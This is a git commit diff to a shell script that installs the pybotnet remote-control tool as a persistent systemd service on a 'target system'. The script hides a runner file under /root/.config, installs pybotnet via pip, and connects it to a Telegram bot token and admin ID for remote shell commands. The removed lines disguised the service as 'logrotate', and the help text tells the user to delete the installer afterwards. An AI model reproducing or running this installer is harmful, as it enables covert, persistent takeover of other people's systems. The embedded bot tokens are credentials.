27fe3f696d47386ad5cd209f9bb04c78a6398031
onionj <onionj98@gmail.com>
2022-07-28 03:49:57 +0430

    change install_as_service.sh

--- install_as_service.sh
+++ install_as_service.sh
@@ -1,41 +1,41 @@
 #!/bin/sh
 
-## add pybotnet to linux systemd service ##
+## add pybotnet to debian base linux systemd-service ##
 
 # -- HELP --:
 # - replace youre telegram_bot_token, admin_id and bot_alias_name with your own
 # - copy this file to target system
 # - run this file by `sudo sh ./install_as_service.sh`
 # - remove install_as_service.sh from target system
-# - if pybotnet update is available, in telegram bot send `/shell systemctl restart logrotate` to reinstall pybotnet
+# - if pybotnet update is available, in telegram bot send `/shell systemctl restart [service_name (pybotnet)]` to reinstall pybotnet
 
-telegram_bot_token=50885227232:AAFdKCluWopE9Mg-5Mj1WURfuu90cyGsBGY
-admin_id=79023471166
-bot_name=ati_logrotate
+telegram_bot_token=50885227232:AAFdKCluWopE9Mg-5Mj1WURfuu90cyGssBGY
+admin_id=49023471166
+bot_name=example_name_pybotnet
+
+service_name=pybotnet
+runner="/root/.config/.$service_name.sh"
 
 
-botnet="/root/.config/.logrotate.sh"
-
-
-tee<<EOF > $botnet
+tee<<EOF > $runner
 #!/bin/
-apt-get update -qq > /dev/null 2>&1 &&
+apt-get update > /dev/null 2>&1 &&
 apt-get install python3-pip -y -qq > /dev/null 2>&1 &&
 apt-get install python3-dev -y -qq > /dev/null 2>&1 &&
 pip3 install "pybotnet>=2<3" -U -qqq &&
 python3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name
 EOF
 
-chmod +x $botnet
+chmod +x $runner
 
-tee<<EOF > /etc/systemd/system/logrotate.service
+tee<<EOF > /etc/systemd/system/$service_name.service
 [Unit]
-Description=Logrotate
+Description=$service_name
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/sh $botnet
+ExecStart=/bin/sh $runner
 Restart=always
 RestartSec=10
 
@@ -43,7 +43,7 @@ RestartSec=10
 WantedBy=multi-user.target
 EOF
 
-chmod 644 /etc/systemd/system/logrotate.service
+chmod 644 /etc/systemd/system/$service_name.service
 systemctl daemon-reload
-systemctl enable logrotate.service
-systemctl restart logrotate.service
+systemctl enable $service_name.service
+systemctl restart $service_name.service
